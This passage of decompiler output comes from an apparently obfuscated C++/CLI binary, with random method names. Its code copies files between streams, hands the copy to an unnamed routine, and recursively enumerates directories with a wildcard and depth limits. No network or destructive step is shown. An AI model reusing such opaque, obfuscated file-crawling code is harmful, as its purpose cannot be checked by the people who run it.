            _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last = stdAllocatorWcharT2;
            _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First = stdAllocatorWcharT3;
            basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT4;
            allocator\u003Cwchar_t\u003E allocatorWcharT3;
            \u003CModule\u003E.std\u002E_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &stdAllocatorWcharT4, \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT3));
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(&stdAllocatorWcharT4, false, 0U);
            forward_iterator_tag __unnamed002;
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_Vector_iterator\u003Cwchar_t\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E(&stdAllocatorWcharT4, _First, _Last, __unnamed002);
            // ISSUE: fault handler
            try
            {
              basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar1;
              \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar1, \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ec_str(&stdAllocatorWcharT4), 32, 64, 1);
              // ISSUE: fault handler
              try
              {
                basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E stdCharTraitsChar2;
                \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdCharTraitsChar2, \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(&stdAllocatorChar2), 34, 64, 1);
                // ISSUE: fault handler
                try
                {
                  \u003CModule\u003E.std\u002Ebasic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E\u003C\u003C((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) &stdCharTraitsChar2, (basic_streambuf\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Erdbuf(&stdCharTraitsChar1));
                  \u003CModule\u003E.zfUNiNlXhZbFq(&stdCharTraitsChar2);
                  \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar2);
                  \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002Eclose(&stdCharTraitsChar1);
                  \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(obj0, &stdAllocatorChar2);
                  num1 = 1U;
                }
                __fault
                {
                  // ISSUE: method pointer
                  // ISSUE: cast to a function pointer type
                  \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar2);
                }
                \u003CModule\u003E.std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar2);
              }
              __fault
              {
                // ISSUE: method pointer
                // ISSUE: cast to a function pointer type
                \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdCharTraitsChar1);
              }
              \u003CModule\u003E.std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdCharTraitsChar1);
            }
            __fault
            {
              // ISSUE: method pointer
              // ISSUE: cast to a function pointer type
              \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT4);
            }
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT4);
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
          }
          // ISSUE: fault handler
          try
          {
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            if (^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) != 0)
            {
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              // ISSUE: cast to a reference type
              // ISSUE: explicit reference operation
              \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Edeallocate((allocator\u003Cwchar_t\u003E*) ((IntPtr) &stdAllocatorWcharT1 + 8), (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12), (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT1 + 20) - ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) >> 1));
            }
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 12) = 0;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 16) = 0;
            // ISSUE: cast to a reference type
            // ISSUE: explicit reference operation
            ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 20) = 0;
          }
          __fault
          {
            // ISSUE: method pointer
            // ISSUE: cast to a function pointer type
            \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT1);
          }
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          \u003CModule\u003E.delete((void*) ^(int&) ref stdAllocatorWcharT1);
        }
        __fault
        {
          // ISSUE: method pointer
          // ISSUE: cast to a function pointer type
          \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar2);
        }
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar2);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor), (void*) &stdAllocatorChar1);
      }
      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(&stdAllocatorChar1);
      return obj0;
    }
    __fault
    {
      if (((int) num1 & 1) != 0)
      {
        uint num6 = num1 & 4294967294U;
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
      }
    }
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool ADUixeTjiMK(sbyte* p, int limit, int countLimit)
  {
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar1;
    \u003CModule\u003E.hwAYOEKvSX(&stdAllocatorChar1, p, true);
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar1);
    if (countLimit >= limit - 1)
      return true;
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar2;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar2, p);
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1;
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2;
    basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar3;
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT3;
    stack\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Adeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u0020\u003E stdAllocatorWcharT4;
    void* firstFileW;
    _bstr_t.Data_t* dataTPtr1;
    // ISSUE: fault handler
    try
    {
      _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar4;
      _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E _Last = *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eend(&stdAllocatorChar2, &stdAllocatorChar4);
      _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar5;
      _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E _First = *\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ebegin(&stdAllocatorChar2, &stdAllocatorChar5);
      allocator\u003Cwchar_t\u003E allocatorWcharT;
      \u003CModule\u003E.std\u002E_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D((_String_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &stdAllocatorWcharT1, \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002E\u007Bctor\u007D(&allocatorWcharT));
      \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Tidy(&stdAllocatorWcharT1, false, 0U);
      forward_iterator_tag __unnamed002;
      \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Construct\u003Cclass\u0020std\u003A\u003A_String_iterator\u003Cchar\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E(&stdAllocatorWcharT1, _First, _Last, __unnamed002);
      // ISSUE: fault handler
      try
      {
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT2, (char*) &\u003CModule\u003E.\u003F\u003F_C\u0040_13BBDEGPLJ\u0040\u003F\u0024AA\u003F\u0024CK\u003F\u0024AA\u003F\u0024AA\u0040);
        // ISSUE: fault handler
        try
        {
          \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar3, 3, 1);
          // ISSUE: fault handler
          try
          {
            \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorWcharT3);
            // ISSUE: fault handler
            try
            {
              \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bctor\u007D((deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E*) &stdAllocatorWcharT4);
              // ISSUE: fault handler
              try
              {
                \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002Epush_back((deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E*) &stdAllocatorWcharT4, &stdAllocatorWcharT1);
                while (true)
                {
                  // ISSUE: cast to a reference type
                  // ISSUE: explicit reference operation
                  if (^(int&) ((IntPtr) &stdAllocatorWcharT4 + 28) != 0)
                  {
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    uint num1 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT4 + 24) + ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 28));
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 24) > num1)
                      \u003CModule\u003E._invalid_parameter_noinfo();
                    _Deque_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E allocatorWcharT1_1;
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ref allocatorWcharT1_1 = ^(int&) ref stdAllocatorWcharT4;
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    ^(int&) ((IntPtr) &allocatorWcharT1_1 + 4) = (int) num1;
                    _Deque_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E allocatorWcharT1_2 = allocatorWcharT1_1;
                    \u003CModule\u003E.std\u002E_Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E\u002E\u002B\u003D((_Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E*) &allocatorWcharT1_2, -1);
                    _Deque_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E allocatorWcharT1_3 = allocatorWcharT1_2;
                    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u003D(&stdAllocatorWcharT1, \u003CModule\u003E.std\u002E_Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E\u002E\u002A((_Deque_const_iterator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u002C1\u003E*) &allocatorWcharT1_3));
                    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar6;
                    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar6, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_00CNPNBAHC\u0040\u003F\u0024AA\u0040);
                    // ISSUE: fault handler
                    try
                    {
                      \u003CModule\u003E.std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Estr(&stdAllocatorChar3, &stdAllocatorChar6);
                    }
                    __fault
                    {
                      // ISSUE: method pointer
                      // ISSUE: cast to a function pointer type
                      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar6);
                    }
                    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorChar6);
                    \u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E(\u003CModule\u003E.std\u002Eoperator\u003C\u003C\u003Cstruct\u0020std\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E((basic_ostream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &stdAllocatorChar3 + 8), p), (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_01NBENCBCI\u0040\u003F\u0024CK\u003F\u0024AA\u0040);
                    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT5;
                    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* stdAllocatorWcharTPtr = \u003CModule\u003E.std\u002Eoperator\u002B\u003Cwchar_t\u002Cstruct\u0020std\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cclass\u0020std\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E(&stdAllocatorWcharT5, &stdAllocatorWcharT1, &stdAllocatorWcharT2);
                    // ISSUE: fault handler
                    try
                    {
                      \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u003D(&stdAllocatorWcharT3, stdAllocatorWcharTPtr);
                    }
                    __fault
                    {
                      // ISSUE: method pointer
                      // ISSUE: cast to a function pointer type
                      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorWcharT5);
                    }
                    \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(&stdAllocatorWcharT5);
                    // ISSUE: cast to a reference type
                    // ISSUE: explicit reference operation
                    if (^(int&) ((IntPtr) &stdAllocatorWcharT4 + 28) != 0)
                    {
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      uint num2 = (uint) (^(int&) ((IntPtr) &stdAllocatorWcharT4 + 28) + ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 24) - 1);
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 20) <= num2)
                      {
                        // ISSUE: cast to a reference type
                        // ISSUE: explicit reference operation
                        num2 -= (uint) ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 20);
                      }
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) *(int*) ((int) num2 * 4 + ^(int&) ((IntPtr) &stdAllocatorWcharT4 + 16)));
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
                      // ISSUE: cast to a reference type
                      // ISSUE: explicit reference operation
